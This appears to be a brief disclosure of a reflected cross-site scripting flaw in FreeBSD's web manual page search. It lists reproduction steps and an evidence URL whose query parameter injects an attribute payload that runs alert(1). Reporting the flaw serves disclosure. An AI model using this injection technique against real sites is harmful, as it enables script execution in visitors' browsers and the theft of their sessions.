creator: 12un91h9.hello@gmail.com
text:
Vuln: XSS Cross-site script
Description: XSS appears in FreeBSD Manual Pages when a visitor does the following actions:
1. Search any command
2. Click "apropos" button beside "man" button
3. Concat the previous query param in the URL with " autofocus onfocus="alert(1)

Evidence link: https://www.freebsd.org/cgi/man.cgi?apropos=1&arch=default&format=html&manpath=FreeBSD%2014.0-CURRENT&query=id%22autofocus%20onfocus=%22alert(1)&sektion=0
